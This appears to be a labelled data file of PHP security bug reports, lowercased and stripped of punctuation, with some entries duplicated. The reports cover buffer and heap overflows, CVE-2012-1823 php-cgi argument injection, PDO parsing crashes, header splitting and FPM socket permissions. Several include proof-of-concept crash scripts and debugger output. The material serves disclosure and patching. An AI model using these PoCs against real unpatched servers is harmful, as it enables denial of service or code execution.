buffer overflow in apache_request_headers resubmitting since the patch did n't include last time and i can not view or edit my own security bug makes sense apache_request_headers has a loop starting at line 1617 which copies the name of an environment variable while fixing case and converting to this loop is only supposed to copy the variable name eg cookie from http_cookie however it continues until the end of the entire environment variable the problem is it is copying it into buffer t which is a pointer to buf 128 if the string being copied is longer than 128 bytes it will overflow the buffer this seems to be present in 5.4.x patch in case it does n't include again diff git a/sapi/cgi/cgi_main.c b/sapi/cgi/cgi_main.c index 4643882 ef876fb 100644 a/sapi/cgi/cgi_main.c b/sapi/cgi/cgi_main.c 1614,7 1614,9 php_function apache_request_headers var q t q p while p if p if p break else if p q p if p test script running roundcube with php 5.4 will trigger this bug due to the large amount of cookie data and other stack conditions this is where i discovered it the included patch fixes this bug expected result php should function normally actual result php seg faults in zif_apache_request_headers 5 in stack_chk_fail at stack_chk_fail.c:29 no locals 6 in zif_apache_request_headers ht=0 return_value return_value_ptr this_ptr return_value_used=1685382481 at tmp/buildd/php5-5.4.1~rc1/sapi/cgi/cgi_main.c:1647 buf 023\000\000\000\000\000\000\000x-roundcube-request=4613f5de1ef497b2c16f60deb9be83de\000\060 gecko/20100101 firefox/11.0\000sviewsplitter=296 identviewsplitter env q undcube-sessauth=sdcc36a0f8bd6c79753726fdf6b6818a276a2581a var address out of bounds alloc_size 128 buf 023\000\000\000\000\000\000\000x-roundcube-request=4613f5de1ef497b2c16f60deb9be83de\000\060 gecko/20100101 firefox/11.0\000sviewsplitter=296 identviewsplitter buf 023\000\000\000\000\000\000\000x-roundcube-request=4613f5de1ef497b2c16f60deb9be83de\000\060 gecko/20100101 firefox/11.0\000sviewsplitter=296 identviewsplitter 7 in no symbol table info available 8 in no symbol table info available	11
vu 520827 php-cgi query string parameter vulnerability u 520827 php-cgi query string parameter vulnerability cve cve-2012-1823 keywords php php-cgi overview php-cgi-based setups contain a vulnerability when parsing query string parameters from php files description according to php s website php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html when php is used in a cgi-based setup such as apache s mod_cgid the php-cgi receives a processed query string parameter as command line arguments which allows command-line switches such as s d or c to be passed to the php-cgi binary which can be exploited to disclose source code and obtain arbitrary code execution an example of the s command allowing an attacker to view the source code of index.php is below impact a remote unauthenticated attacker could obtain sensitive information cause a denial of service condition or may be able to execute arbitrary code with the privileges of the web server solution we are currently unaware of a practical solution to this problem references credit thanks to de eindbazen for reporting this vulnerability this document was written by michael orlando	9
vu 520827 php-cgi query string parameter vulnerability u 520827 php-cgi query string parameter vulnerability cve cve-2012-1823 keywords php php-cgi overview php-cgi-based setups contain a vulnerability when parsing query string parameters from php files description according to php s website php is a widely-used general-purpose scripting language that is especially suited for web development and can be embedded into html when php is used in a cgi-based setup such as apache s mod_cgid the php-cgi receives a processed query string parameter as command line arguments which allows command-line switches such as s d or c to be passed to the php-cgi binary which can be exploited to disclose source code and obtain arbitrary code execution an example of the s command allowing an attacker to view the source code of index.php is below impact a remote unauthenticated attacker could obtain sensitive information cause a denial of service condition or may be able to execute arbitrary code with the privileges of the web server solution we are currently unaware of a practical solution to this problem references credit thanks to de eindbazen for reporting this vulnerability this document was written by michael orlando	9
secunia sa44335 arbitrary code execution i see no evidence that php.net is aware of this issue but it seems known elsewhere netbsd pkgsrc reports 5.3.10 as vulnerable due to this bug and refuses to install without an override see the vulnerability is caused due to an integer overflow error within the phar extension in the phar_parse_tarfile function ext/phar/tar.c and can be exploited to cause a heap-based buffer overflow via a specially crafted tar file successful exploitation may allow execution of arbitrary code the vulnerability is reported in version 5.3.6 other versions may also be affected	11
a parsing bug in the prepared statements can lead to access violations inconsistent parsing of php pdo prepared statements erroneous design of parsers state machine under special circumstances parsing of prepared statements does not stop leading in cycling the whole stack without terminating on 0 this leads to access violations accessing of stack data dos bug description there are several design errors in the state-machine responsible for parsing php pdo based statement objects these errors are based on the state-machines inability to consistently check the supplied sql-query under special circumstances an attacker is able to force the responsible pdo code to iterate beyond the termination of the supplied query string resulting in a buffer out of bounds access this access may lead to uncontrollable as well as attacker controllable behavior and access violations caused by the code iterating the whole stack and trying to access addresses beyond the stack end preconditions pdo is used to access the db for remote attacks user must be able to directly control any part of the query string prior its preparation stm prepare we are well aware that this is a general coding fault which leads to other security relevant implications but sadly enough it鈥檚 also quite common in many frameworks projects to use prepared statements with user controlled data instead of binding them after preparation mysql_real_escape is no mitigation for this vulnerability as stated above there are indeed many projects using user controlled data encoded by mysql_real_escape like this argname=mysql_real_escape get 鈥楴ame鈥橾 db prepare 鈥淪elect from 鈥榰ser鈥 where 鈥榰sername鈥 鈥 argname鈥 鈥 execute test script we have several samples these are some of them this poc directly prepares the statements query passed to the script via get request argument 鈥渜uery鈥 examples poc_pdo_short_get.php query poc_pdo_short_get.php query php try db new pdo mysql host=localhost dbname=aws root tokens select from user sql select from user stmt db prepare select from user mysql_real_escape_string get query stmt execute crash stmt bindcolumn 2 type pdo param_str 256 stmt fetch pdo fetch_bound print_r type catch exception e echo failed e getmessage php try db new pdo mysql host=localhost dbname=aws root tokens select from user sql stmt db prepare sql stmt execute crashes php worker in pdo_parse_params stmt bindcolumn 2 type pdo param_str 256 stmt fetch pdo fetch_bound print_r type catch exception e echo failed e getmessage pre php echo hmm beginning\n try db new pdo mysql host=localhost dbname=aws root echo lets get it on\n tokens select from user sql select from user echo sql stmt db prepare sql echo prepared n print_r stmt stmt execute crashes php worker in pdo_parse_params print_r stmt echo executed n stmt bindcolumn 2 type pdo param_str 256 stmt fetch pdo fetch_bound echo data-\n print_r type echo data n catch exception e echo exception echo failed e getmessage echo hmmm end\n pre actual result root bt opt/lampp gdb bin/php gdb run poc_pdo_linux_short_1.php starting program opt/lampp/bin/php opt/lampp/poc_pdo_linux_short_1.php thread debugging using libthread_db enabled program received signal sigsegv segmentation fault in gdb bt 0 in 1 in pdo_parse_params 2 in 3 in 4 in execute 5 in zend_execute_scripts 6 in php_execute_script 7 in main	11
header can not detect the multi-line header with cr as of php 5.1.2 header can no longer be used to send multiple response headers in a single call to prevent the http response splitting attack header only checks the linefeed lf as line-end marker it does n't check the carriage-return cr however some browsers including google chrome ie also recognize cr as the line end it is reported by mr tokumaru the current specification of header still has the vulnerability against the http header splitting attack test script php header location get url print_r cookie accessed from the url like it should be executed with google chrome or ie expected result warning header may not contain more than a single header new line detected in xxxx/head1.php on line 2 array actual result array name foo	9
ext\openssl\tests\openssl_encrypt_crash.phpt fails the test fails with the message variable i used without being initialized expected result test pass actual result test fail the diff is 002 string 4 done	11
heap based buffer overflow in quoted_printable_encode quoted_printable_encode calculates the string size wrong so overflow is possible test script quoted_printable_encode str_repeat xf4 1000 expected result no crash actual result segfault	11
heap corruption in xml parser badly formed xml might corrupt the heap test script php xml_parse_into_struct xml_parser_create_ns str_repeat blah 1000 a expected result warning xml_parse_into_struct maximum depth exceeded results truncated actual result heap corruption	11
interger overflow in sndtojewish interger overflow occurs in sndtojewish last correct value is 324542846 with very large value ex 9223372036854746369 php hangs test script php for i=324542840 i 324542850 i echo i jdtojewish i n expected result 324542840:12/7/887605 324542841:12/8/887605 324542842:12/9/887605 324542843:12/10/887605 324542844:12/11/887605 324542845:12/12/887605 324542846:12/13/887605 324542847:0/0/0 324542848:0/0/0 324542849:0/0/0 actual result 324542840:12/7/887605 324542841:12/8/887605 324542842:12/9/887605 324542843:12/10/887605 324542844:12/11/887605 324542845:12/12/887605 324542846:12/13/887605 324542847:3/434978988/887 324542848:3/434978989/887 324542849:3/434978990/887	11
mimetype detection segfaults on mp3 file uploading an mp3 file or using fileinfo to check the mimetype of an mp3 file causes a crash 5.4.14 works fine 5.4.15 crashes i bisected it down to 10367fa7c6a4a2cf9bee02d8905e284185428f09 does n't seem to happen for every mp3 file so here s the one i used if you need any more information to track it down or ca n't reproduce it i m happy to help test script php function mimetype file fileinfo new finfo fileinfo_mime_type mimetype fileinfo file file return mimetype echo mimetype test.mp3 n expected result output should be audio/mpeg and it should n't crash actual result error in home/flo/git/php-src/sapi/cgi/php-cgi munmap_chunk invalid pointer backtrace usr/lib/libc.so.6 home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi home/flo/git/php-src/sapi/cgi/php-cgi execute home/flo/git/php-src/sapi/cgi/php-cgi zend_execute_scripts home/flo/git/php-src/sapi/cgi/php-cgi php_execute_script home/flo/git/php-src/sapi/cgi/php-cgi usr/lib/libc.so.6 libc_start_main home/flo/git/php-src/sapi/cgi/php-cgi	9
heap buffer over-read in dateinterval heap buffer over-read in dateinterval versions affected at least 5.5.3 and 5.6.0-dev master-git built with addresssanitizer prefix and debug test script php new dateinterval p170141183460469231731687303715884105729d actual result 6428 error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 1 at thread t0 0 in scan php-src/ext/date/lib/parse_iso_intervals.re:351 1 in timelib_strtointerval php-src/ext/date/lib/parse_iso_intervals.re:485 discriminator 1 2 in date_interval_initialize php-src/ext/date/php_date.c:3984 3 in zim_dateinterval___construct php-src/ext/date/php_date.c:4147 4 in zend_do_fcall_common_helper_spec php-src/zend/zend_vm_execute.h:554 5 in zend_do_fcall_by_name_spec_handler php-src/zend/zend_vm_execute.h:689 6 in execute_ex php-src/zend/zend_vm_execute.h:363 7 in zend_execute php-src/zend/zend_vm_execute.h:388 8 in zend_execute_scripts php-src/zend/zend.c:1334 9 in php_execute_script php-src/main/main.c:2490 10 in do_cli php-src/sapi/cli/php_cli.c:994 11 in main php-src/sapi/cli/php_cli.c:1378 12 in libc_start_main 13 in start is located 0 bytes to the right of 42-byte region allocated by thread t0 here 0 in 0 1 in timelib_string php-src/ext/date/lib/parse_iso_intervals.re:125 2 in scan php-src/ext/date/lib/parse_iso_intervals.re:320 3 in timelib_strtointerval php-src/ext/date/lib/parse_iso_intervals.re:485 discriminator 1 4 in date_interval_initialize php-src/ext/date/php_date.c:3984 5 in zim_dateinterval___construct php-src/ext/date/php_date.c:4147 6 in zend_do_fcall_common_helper_spec php-src/zend/zend_vm_execute.h:554 7 in zend_do_fcall_by_name_spec_handler php-src/zend/zend_vm_execute.h:689 8 in execute_ex php-src/zend/zend_vm_execute.h:363 9 in zend_execute php-src/zend/zend_vm_execute.h:388 10 in zend_execute_scripts php-src/zend/zend.c:1334 11 in php_execute_script php-src/main/main.c:2490 12 in do_cli php-src/sapi/cli/php_cli.c:994 13 in main php-src/sapi/cli/php_cli.c:1378 14 in libc_start_main	11
heap overflow vulnerability in imagecrop the imagecrop function can be used to crop an image with the following call dimensions array x 10 y 10 width 50 height 50 new_image image image dimensions the implementation of imagecrop in ext/gd/gd.c performs very little checking of the supplied dimensions gdrect rect if zend_hash_find hash_of z_rect x sizeof x void tmp failure rect.x z_lval_pp tmp else one issue here is that there is no check of tmp s type nor a conversion this means that if the dimensions array contains the key x its zval s value will be treated as an integer even if it s really a string or an array this can be used as an information leak vulnerability because strings and array contain pointers which can be used for subsequent exploits see poc 1 the rect variable is then used in a call to gdimagecrop im_crop gdimagecrop im rect this function then uses the user-supplied dimensions for various calculations if src truecolor dst gdimagecreatetruecolor crop width crop height gdimagesavealpha dst 1 else dst gdimagecreate crop width crop height gdimagepalettecopy dst src dst transparent src transparent the gdimagecreatetruecolor and gdimagecreate functions are smart enough to block any attempt to overflow the width and height parameters returning a null pointer when this happens however this code has an issue of not checking the return value of these functions using the dst variable for memory writes unconditionally this means it can cause a null pointer or a close-to-null pointer write which is probably just crash the process but since the gd image structure is very large it could happen to even touch allocated memory see poc 2 the function then performs some bounds checks if src sx crop x crop width 1 crop width src sx crop x 1 if src sy crop y crop height 1 crop height src sy crop y 1 these are using signed integer arithmetics and can be overflown and tricked into incorrect calculations later for true-color the pixels are copied with this code int y crop y unsigned int dst_y 0 while y crop y crop height 1 todo replace 4 w/byte per channel||pitch once available memcpy dst tpixels dst_y src tpixels y crop x crop width 4 remember that crop x and crop y are completely user-supplied values and we can supply negative values this way we can force the copying code to read outside of the source image pixel data causing a crash or an information leak see poc 3 we must however keep the crop width and crop height positive and reasonable because they are used at the beginning of the function to create a destination bitmap we can however trick the already mentioned bounds checking code if src sx crop x crop width 1 crop width src sx crop x 1 when supplying a very large crop x value we can make the condition pass assigning a value to crop width which is larger than the real destination s pixel buffer width the memcpy will then copy more data than the heap-based buffers can hold causing a heap-based buffer overflow see poc 4 all the supplied pocs will cause a crash on 32-bit systems first the pocs will segfault due to invalid memory read the last one will crash due to a heap overflow gdb output attached but the backtrace is useless because the crash occurs much later at php s shutdown and cleanup tested on a 32-bit ubuntu server machine all versions of php containing the imagecrop function are vulnerable i.e php 5.5.0 and newer proposed patch to fix the mentioned vulnerabilities is attached and it also adds a test for the pocs into the php test suite test script poc 1 poc 1 img imagecreatetruecolor 10 10 img imagecrop img array x a y 0 width 10 height 10 poc 2 poc 2 img imagecreatetruecolor 10 10 img imagecrop img array x 0 y 0 width 1 height 10 poc 3 poc 3 img imagecreatetruecolor 10 10 img imagecrop img array x 20 y 20 width 10 height 10 poc 4 poc 4 img imagecreatetruecolor 10 10 img imagecrop img array x y 0 width 10 height 10 actual result gdb session from poc 4 kuba sonny php/php-src gdb sapi/cli/php gdb r crop.php starting program home/kuba/php/php-src/sapi/cli/php crop.php fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size program received signal sigsegv segmentation fault in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1384 if p info._size zend_mm_next_block p info._prev gdb bt 0 in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1 in zend_mm_free_int heap p zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2068 2 in efree ptr zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2440 3 in php_gd_gdimagedestroy im at home/kuba/php/php-src/ext/gd/libgd/gd.c:242 4 in php_free_gd_image rsrc at home/kuba/php/php-src/ext/gd/gd.c:1077 5 in list_entry_destructor ptr at home/kuba/php/php-src/zend/zend_list.c:183 6 in zend_hash_del_key_or_index ht executor_globals+344 arkey nkeylength=0 h=5 flag=1 at home/kuba/php/php-src/zend/zend_hash.c:508 7 in zend_list_delete id=5 at home/kuba/php/php-src/zend/zend_list.c:57 8 in zval_dtor_func zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.c:62 9 in zval_dtor zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.h:35 10 in i_zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute.h:79 11 in zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute_api.c:427 12 in zval_ptr_dtor_wrapper zval_ptr at home/kuba/php/php-src/zend/zend_variables.c:182 13 in zend_hash_apply_deleter ht executor_globals+188 p at home/kuba/php/php-src/zend/zend_hash.c:626 14 in zend_hash_graceful_reverse_destroy ht executor_globals+188 at home/kuba/php/php-src/zend/zend_hash.c:663 15 in shutdown_executor at home/kuba/php/php-src/zend/zend_execute_api.c:247 16 in zend_deactivate at home/kuba/php/php-src/zend/zend.c:953 17 in php_request_shutdown dummy at home/kuba/php/php-src/main/main.c:1807 18 in do_cli argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1177 19 in main argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1378	11
heap overflow vulnerability in imagecrop the imagecrop function can be used to crop an image with the following call dimensions array x 10 y 10 width 50 height 50 new_image image image dimensions the implementation of imagecrop in ext/gd/gd.c performs very little checking of the supplied dimensions gdrect rect if zend_hash_find hash_of z_rect x sizeof x void tmp failure rect.x z_lval_pp tmp else one issue here is that there is no check of tmp s type nor a conversion this means that if the dimensions array contains the key x its zval s value will be treated as an integer even if it s really a string or an array this can be used as an information leak vulnerability because strings and array contain pointers which can be used for subsequent exploits see poc 1 the rect variable is then used in a call to gdimagecrop im_crop gdimagecrop im rect this function then uses the user-supplied dimensions for various calculations if src truecolor dst gdimagecreatetruecolor crop width crop height gdimagesavealpha dst 1 else dst gdimagecreate crop width crop height gdimagepalettecopy dst src dst transparent src transparent the gdimagecreatetruecolor and gdimagecreate functions are smart enough to block any attempt to overflow the width and height parameters returning a null pointer when this happens however this code has an issue of not checking the return value of these functions using the dst variable for memory writes unconditionally this means it can cause a null pointer or a close-to-null pointer write which is probably just crash the process but since the gd image structure is very large it could happen to even touch allocated memory see poc 2 the function then performs some bounds checks if src sx crop x crop width 1 crop width src sx crop x 1 if src sy crop y crop height 1 crop height src sy crop y 1 these are using signed integer arithmetics and can be overflown and tricked into incorrect calculations later for true-color the pixels are copied with this code int y crop y unsigned int dst_y 0 while y crop y crop height 1 todo replace 4 w/byte per channel||pitch once available memcpy dst tpixels dst_y src tpixels y crop x crop width 4 remember that crop x and crop y are completely user-supplied values and we can supply negative values this way we can force the copying code to read outside of the source image pixel data causing a crash or an information leak see poc 3 we must however keep the crop width and crop height positive and reasonable because they are used at the beginning of the function to create a destination bitmap we can however trick the already mentioned bounds checking code if src sx crop x crop width 1 crop width src sx crop x 1 when supplying a very large crop x value we can make the condition pass assigning a value to crop width which is larger than the real destination s pixel buffer width the memcpy will then copy more data than the heap-based buffers can hold causing a heap-based buffer overflow see poc 4 all the supplied pocs will cause a crash on 32-bit systems first the pocs will segfault due to invalid memory read the last one will crash due to a heap overflow gdb output attached but the backtrace is useless because the crash occurs much later at php s shutdown and cleanup tested on a 32-bit ubuntu server machine all versions of php containing the imagecrop function are vulnerable i.e php 5.5.0 and newer proposed patch to fix the mentioned vulnerabilities is attached and it also adds a test for the pocs into the php test suite test script poc 1 poc 1 img imagecreatetruecolor 10 10 img imagecrop img array x a y 0 width 10 height 10 poc 2 poc 2 img imagecreatetruecolor 10 10 img imagecrop img array x 0 y 0 width 1 height 10 poc 3 poc 3 img imagecreatetruecolor 10 10 img imagecrop img array x 20 y 20 width 10 height 10 poc 4 poc 4 img imagecreatetruecolor 10 10 img imagecrop img array x y 0 width 10 height 10 actual result gdb session from poc 4 kuba sonny php/php-src gdb sapi/cli/php gdb r crop.php starting program home/kuba/php/php-src/sapi/cli/php crop.php fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size program received signal sigsegv segmentation fault in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1384 if p info._size zend_mm_next_block p info._prev gdb bt 0 in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1 in zend_mm_free_int heap p zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2068 2 in efree ptr zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2440 3 in php_gd_gdimagedestroy im at home/kuba/php/php-src/ext/gd/libgd/gd.c:242 4 in php_free_gd_image rsrc at home/kuba/php/php-src/ext/gd/gd.c:1077 5 in list_entry_destructor ptr at home/kuba/php/php-src/zend/zend_list.c:183 6 in zend_hash_del_key_or_index ht executor_globals+344 arkey nkeylength=0 h=5 flag=1 at home/kuba/php/php-src/zend/zend_hash.c:508 7 in zend_list_delete id=5 at home/kuba/php/php-src/zend/zend_list.c:57 8 in zval_dtor_func zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.c:62 9 in zval_dtor zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.h:35 10 in i_zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute.h:79 11 in zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute_api.c:427 12 in zval_ptr_dtor_wrapper zval_ptr at home/kuba/php/php-src/zend/zend_variables.c:182 13 in zend_hash_apply_deleter ht executor_globals+188 p at home/kuba/php/php-src/zend/zend_hash.c:626 14 in zend_hash_graceful_reverse_destroy ht executor_globals+188 at home/kuba/php/php-src/zend/zend_hash.c:663 15 in shutdown_executor at home/kuba/php/php-src/zend/zend_execute_api.c:247 16 in zend_deactivate at home/kuba/php/php-src/zend/zend.c:953 17 in php_request_shutdown dummy at home/kuba/php/php-src/main/main.c:1807 18 in do_cli argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1177 19 in main argc=2 argv at home/kuba/php/php-src/sapi/cli/php_cli.c:1378	11
sapi/fpm possible privilege escalation due to insecure default configuration both default config and compiled-in defaults of sapi/fpm lead to configurations which easily allow any user with rights to connect to a unix socket to run arbitrary code with the permissions of the fpm user i agree that similar problems are to be expected when using tcp sockets but as soon as an admin chooses to set the listen.user/listen.group options it is expected that these restrictions are effective somehow which they are not a typical scenario for this issue shared hosting environment with multiple fpm pools running with different permissions user1 user2 user1 can easily run code as user2 by pretending to be a fastcgi client and connecting to var/run/php-fpm.user1.sock other scenarios are possible as well regarding the handling of this issue i suspect that this issue is of different severity for you and for distros shipping with insecure default configs would it be possible to keep this issue private and have no code committed yet but to notify distros openwall.org once a patch is ready please let me know whether you are ok with this and whether you want me to handle distros contact sockets should be created with sane default permissions 0660 default config should suggest sane default permissions 0660 the poc should return some error code depending on the fastcgi client in my case 503 service unavailable once this is fixed user2 can run code with the permissions of user1	6
fileinfo cdf_read_short_sector insufficient boundary check cve-2014-0207 was assigned to an incorrect boundary check in the cdf_read_short_sector function the issue was corrected as part of this upstream commit diff-0	7
fileinfo numerous file_printf calls resulting in performance degradation cve-2014-0237 many sections issue with crafted cdf files leading to many file_printf calls that trigger bad performance and possibly some asprintf issues upstream patch	7
fileinfo cdf infinite loop in nelements dos cve-2014-0238 many sections issue with crafted cdf files leading to many file_printf calls that trigger bad performance and possibly some asprintf issues notice bad cve refers in the commit title	7
heap overflow vulnerability in imagecrop the imagecrop function can be used to crop an image with the following call dimensions array x 10 y 10 width 50 height 50 new_image image image dimensions the implementation of imagecrop in ext/gd/gd.c performs very little checking of the supplied dimensions gdrect rect if zend_hash_find hash_of z_rect x sizeof x void tmp failure rect.x z_lval_pp tmp else one issue here is that there is no check of tmp s type nor a conversion this means that if the dimensions array contains the key x its zval s value will be treated as an integer even if it s really a string or an array this can be used as an information leak vulnerability because strings and array contain pointers which can be used for subsequent exploits see poc 1 the rect variable is then used in a call to gdimagecrop im_crop gdimagecrop im rect this function then uses the user-supplied dimensions for various calculations if src truecolor dst gdimagecreatetruecolor crop width crop height gdimagesavealpha dst 1 else dst gdimagecreate crop width crop height gdimagepalettecopy dst src dst transparent src transparent the gdimagecreatetruecolor and gdimagecreate functions are smart enough to block any attempt to overflow the width and height parameters returning a null pointer when this happens however this code has an issue of not checking the return value of these functions using the dst variable for memory writes unconditionally this means it can cause a null pointer or a close-to-null pointer write which is probably just crash the process but since the gd image structure is very large it could happen to even touch allocated memory see poc 2 the function then performs some bounds checks if src sx crop x crop width 1 crop width src sx crop x 1 if src sy crop y crop height 1 crop height src sy crop y 1 these are using signed integer arithmetics and can be overflown and tricked into incorrect calculations later for true-color the pixels are copied with this code int y crop y unsigned int dst_y 0 while y crop y crop height 1 todo replace 4 w/byte per channel||pitch once available memcpy dst tpixels dst_y src tpixels y crop x crop width 4 remember that crop x and crop y are completely user-supplied values and we can supply negative values this way we can force the copying code to read outside of the source image pixel data causing a crash or an information leak see poc 3 we must however keep the crop width and crop height positive and reasonable because they are used at the beginning of the function to create a destination bitmap we can however trick the already mentioned bounds checking code if src sx crop x crop width 1 crop width src sx crop x 1 when supplying a very large crop x value we can make the condition pass assigning a value to crop width which is larger than the real destination s pixel buffer width the memcpy will then copy more data than the heap-based buffers can hold causing a heap-based buffer overflow see poc 4 all the supplied pocs will cause a crash on 32-bit systems first the pocs will segfault due to invalid memory read the last one will crash due to a heap overflow gdb output attached but the backtrace is useless because the crash occurs much later at php s shutdown and cleanup tested on a 32-bit ubuntu server machine all versions of php containing the imagecrop function are vulnerable i.e php 5.5.0 and newer proposed patch to fix the mentioned vulnerabilities is attached and it also adds a test for the pocs into the php test suite test script poc 1 poc 1 img imagecreatetruecolor 10 10 img imagecrop img array x a y 0 width 10 height 10 poc 2 poc 2 img imagecreatetruecolor 10 10 img imagecrop img array x 0 y 0 width 1 height 10 poc 3 poc 3 img imagecreatetruecolor 10 10 img imagecrop img array x 20 y 20 width 10 height 10 poc 4 poc 4 img imagecreatetruecolor 10 10 img imagecrop img array x y 0 width 10 height 10 actual result gdb session from poc 4 kuba sonny php/php-src gdb sapi/cli/php gdb r crop.php starting program home/kuba/php/php-src/sapi/cli/php crop.php fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size fri dec 27 01:47:50 2013 script home/kuba/php/crop.php home/kuba/php/php-src/ext/gd/libgd/gd.c 242 block status invalid pointer size next.prev invalid pointer prev prev.size program received signal sigsegv segmentation fault in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1384 if p info._size zend_mm_next_block p info._prev gdb bt 0 in zend_mm_check_ptr heap ptr silent=1 zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:1384 1 in zend_mm_free_int heap p zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2068 2 in efree ptr zend_filename home/kuba/php/php-src/ext/gd/libgd/gd.c zend_lineno=242 zend_orig_filename zend_orig_lineno=0 at home/kuba/php/php-src/zend/zend_alloc.c:2440 3 in php_gd_gdimagedestroy im at home/kuba/php/php-src/ext/gd/libgd/gd.c:242 4 in php_free_gd_image rsrc at home/kuba/php/php-src/ext/gd/gd.c:1077 5 in list_entry_destructor ptr at home/kuba/php/php-src/zend/zend_list.c:183 6 in zend_hash_del_key_or_index ht executor_globals+344 arkey nkeylength=0 h=5 flag=1 at home/kuba/php/php-src/zend/zend_hash.c:508 7 in zend_list_delete id=5 at home/kuba/php/php-src/zend/zend_list.c:57 8 in zval_dtor_func zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.c:62 9 in zval_dtor zvalue zend_filename home/kuba/php/php-src/zend/zend_execute.h zend_lineno=79 at home/kuba/php/php-src/zend/zend_variables.h:35 10 in i_zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute.h:79 11 in zval_ptr_dtor zval_ptr zend_filename home/kuba/php/php-src/zend/zend_variables.c zend_lineno=182 at home/kuba/php/php-src/zend/zend_execute_api.c:427 12 in zval_ptr_dtor_wrapper zval_ptr at home/kuba/php/php-src/zend/zend_variables.c:182 13 in zend_hash_apply_deleter ht executor_globals+188 p at home/kuba/php/php-src/zend/zend_hash.c:626 14 in zend_hash_graceful_reverse_destroy ht executor_globals+188 at home/kuba/php/php-src/zend/zend_hash.c:663 15 in shutdown_executor at home/kuba/php/php-src/zend/zend_execute_api.c:247 16 in zend_deactivate 